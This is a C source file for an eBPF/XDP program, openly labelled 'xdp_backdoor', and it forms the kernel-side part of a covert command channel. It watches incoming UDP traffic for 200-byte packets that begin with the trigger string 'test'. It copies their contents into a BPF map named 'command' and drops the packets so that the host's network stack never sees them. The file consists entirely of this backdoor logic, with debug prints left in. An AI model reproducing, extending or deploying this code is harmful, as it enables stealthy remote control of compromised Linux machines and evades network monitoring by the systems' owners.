// https://developers.redhat.com/blog/2021/04/01/get-started-with-xdp
// [ebpf packet filter on payload matching](https://stackoverflow.com/questions/62032878/ebpf-packet-filter-on-payload-matching)
// https://github.com/xdp-project/bpf-next/blob/master/lib/string.c

#include <arpa/inet.h>
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>

#define SIZE1 200
#define SIZE2 180

typedef char PAYLOAD[SIZE1];

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__type(key, __u32);
	__type(value, PAYLOAD);
	__uint(max_entries, 1);
} command SEC(".maps");


void mystrncpy(char *dest, const char *src, size_t count)
{
	char *tmp = dest;

	// https://rexrock.github.io/post/ebpf1/
	#pragma clang loop unroll(full)
	while (count) {
		if ((*tmp = *src) != 0)
			src++;
		tmp++;
		count--;
	}
}


SEC("xdp_backdoor")
int xdp_func(struct xdp_md *ctx)
{
	void *data_end = (void *)(long)ctx->data_end;
	void *data = (void *)(long)ctx->data;
	char match_pattern[] = "test";
	unsigned int payload_size, i;
	struct ethhdr *eth = data;
	unsigned char *payload;
	struct udphdr *udp;
	struct iphdr *ip;

	__u32 key = 0;
	PAYLOAD *value;

	if ((void *)eth + sizeof(*eth) > data_end) {
		bpf_printk("1\n");
		return XDP_PASS;
	}

	ip = data + sizeof(*eth);
	if ((void *)ip + sizeof(*ip) > data_end) {
		bpf_printk("2\n");
		return XDP_PASS;
	}

	if (ip->protocol != IPPROTO_UDP){
		bpf_printk("3: %d\n", ip->protocol);
		return XDP_PASS;
	}

	udp = (void *)ip + sizeof(*ip);
	if ((void *)udp + sizeof(*udp) > data_end){
		bpf_printk("4\n");
		return XDP_PASS;
	}

	//if (udp->dest != ntohs(5005))
	//    return XDP_PASS;

	payload_size = ntohs(udp->len) - sizeof(*udp);
	// Here we use "size - 1" to account for the final '\0' in "test".
	// This '\0' may or may not be in your payload, adjust if necessary.
	if (payload_size != SIZE1) {
		bpf_printk("size dismatch:%d,%d\n",payload_size, SIZE1);
		return XDP_PASS;
	}

	/*
	   if (payload_size < sizeof(match_pattern)) {
	   bpf_printk("size small:%d,%d\n",payload_size,sizeof(match_pattern));
	   return XDP_PASS;
	   }
	   */

	bpf_printk("6\n");
	// Point to start of payload.
	payload = (unsigned char *)udp + sizeof(*udp);
	if ((void *)payload + payload_size > data_end) {
		bpf_printk("xx dismatch:%p,%p\n",(void *)payload + payload_size, data_end);
		return XDP_PASS;
	}

	bpf_printk("7\n");

	// Compare each byte, exit if a difference is found.
	for (i = 0; i < payload_size && payload_size <= SIZE1; i++){
		bpf_printk("8\n");
		if (i == sizeof(match_pattern) - 1) {
			bpf_printk("9\n");
			break;
		} 
		if (payload[i] != match_pattern[i]){
			bpf_printk("10:%d\n",payload[i]);
			bpf_printk("dismatch:%c,%c\n", payload[i], match_pattern[i]);
			return XDP_PASS;
		}
	}

	value = bpf_map_lookup_elem(&command, &key);
	if (payload_size == SIZE1 && value){
		mystrncpy(*value, (char *)payload, SIZE2);
	}

	bpf_printk("DROP\n");
	return XDP_DROP;
}

char _license[] SEC("license") = "GPL";
